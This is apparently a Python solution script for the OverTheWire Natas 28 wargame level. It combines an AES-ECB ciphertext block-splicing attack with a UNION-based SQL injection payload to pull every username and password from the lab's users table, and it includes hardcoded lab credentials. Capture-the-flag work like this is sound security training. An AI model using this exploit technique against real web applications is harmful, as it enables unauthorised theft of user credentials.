import requests
from pwn import *
from urllib.parse import unquote
import base64

url = "http://natas28.natas.labs.overthewire.org/"
url_search = "http://natas28.natas.labs.overthewire.org/search.php/?query="
auth = ("natas28", "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj")

sess = requests.Session()
sess.auth = auth

# pad a dummy query so it aligns perfectly with AES block size (16 bytes)
# this helps identify where plaintext lands in the encrypted output
data = dict(query="A"*10 + "B"*14) # total length: 24 chars → 1.5 blocks
r = sess.post(url, data=data)
 
# extract and decode the base64-encoded ciphertext from the response URL
encoded_ciphertext = r.url.split("query=")[1]
ciphertext = base64.b64decode(unquote(encoded_ciphertext))

# SQL injection payload to extract all usernames and passwords
# "0x3A" is hex for ":" , needed to format results as "username:password"
sql = " UNION ALL SELECT concat(username,0x3A,password) FROM users #"
 
# pad the SQL payload so it fits evenly into AES blocks (16-byte alignment)
# also prepend 10 "A" characters to maintain alignment with the original layout
plaintext = "A"*10 + sql + "B"*(16-(len(sql)%16)) # ensures whole number of blocks

# send the padded SQL injection query to get its encrypted form back
# this ciphertext will contain payload, encrypted by the server
data = dict(query=plaintext)
r = sess.post(url, data=data)

# extract and decode the new ciphertext returned in the URL
# this ciphertext includes SQL payload encrypted by the server
encoded_new_ciphertext = r.url.split("query=")[1]
new_ciphertext = base64.b64decode(unquote(encoded_new_ciphertext))

# calculate the byte range that contains injected SQL (after block 4)
# the server echoes the encrypted query starting from byte 48 (block 3 onward)
offset = 48 + len(plaintext)-10 # adjust based on original 10 "A" padding
encrypted_sql = new_ciphertext[48:offset] # slice out the encrypted SQL portion
 
# replace the original ciphertext's corresponding section with encrypted SQL
# this effectively swaps in malicious payload into a valid encrypted request
final_ciphertext = ciphertext[:64]+encrypted_sql+ciphertext[64:]

# send the modified ciphertext as a base64-encoded query parameter
params = dict(query=base64.b64encode(final_ciphertext).decode())
r = sess.get(url_search, params=params)

# parse the response line by line and look for the password
for i in r.iter_lines():
	decoded = i.decode()
	if "natas29" in decoded:
		print(decoded)
